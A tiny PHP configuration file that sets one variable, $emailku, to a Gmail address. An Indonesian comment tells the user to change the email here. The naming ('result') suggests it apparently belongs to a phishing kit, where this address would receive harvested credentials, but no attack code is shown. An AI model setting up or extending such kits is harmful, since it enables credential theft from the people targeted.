<?php
$emailku = 'uncekresultfresh@gmail.com'; // GANTI EMAIL KAMU DISINI
?>